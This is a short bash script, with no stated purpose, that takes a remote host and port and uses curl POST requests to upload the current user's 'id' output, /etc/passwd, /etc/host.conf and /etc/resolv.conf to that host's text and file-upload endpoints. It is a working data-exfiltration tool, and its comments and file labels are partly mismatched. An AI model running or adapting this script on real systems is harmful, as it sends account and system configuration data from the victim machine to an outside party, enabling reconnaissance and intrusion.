#!/bin/bash
set -x

while getopts ':h:p:' OPTION; 
do
    case $OPTION in
        h)
            host=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
    esac
done
# shift $((OPTIND - 1))

# Get the user ID currently logged in as
curl -X POST http://$host:$port/text/ -F "filename=id.txt" -F "text=$(id)"
curl -X POST http://$host:$port/text/ -F "filename=passwd.txt" -F "text=$(cat /etc/passwd)"
curl -X POST http://$host:$port/text/ -F "filename=host.txt" -F "text=$(cat /etc/passwd)"

# Get password file
curl -X POST http://$host:$port/fileupload/ -F 'file=@/etc/host.conf' -H "Content-Type: multipart/form-data"
curl -X POST http://$host:$port/fileupload/ -F 'file=@/etc/resolv.conf' -H "Content-Type: multipart/form-data"